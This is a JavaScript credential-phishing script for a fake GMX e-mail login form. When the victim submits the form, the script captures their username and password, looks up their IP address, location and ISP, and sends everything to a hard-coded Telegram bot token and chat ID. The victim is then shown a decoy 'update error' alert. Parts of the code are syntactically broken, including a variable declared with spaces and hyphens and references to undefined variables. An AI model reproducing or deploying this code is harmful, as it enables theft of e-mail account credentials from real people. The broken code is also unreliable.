document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function (event) {
        event.preventDefault(); // Prevents the default form submission

        const GMX E-Mail-Address = document.getElementById('usr-id').value;
        const Password = document.getElementById('pwd').value;

        if (!username || !password) {
            alert('Both username and password are required.');
            return;
        }

        // Fetch IP and location info
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const country = data.country_name;
                const city = data.city;
                const isp = data.org;

                const message = `🔹 New Login Attempt 🔹\n👤 Username: ${username}\n🔑 Password: ${password}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;

                // Replace these with your bot token and chat ID
                const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
                const chatId = '6651292809';
                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                const payload = {
                    chat_id: chatId,
                    text: message
                };

                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('Update error please try again in 24hrs.');
                    } else {
                        alert('Error sending message to Telegram.');
                    }
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP info:', error);
            });
    });
});
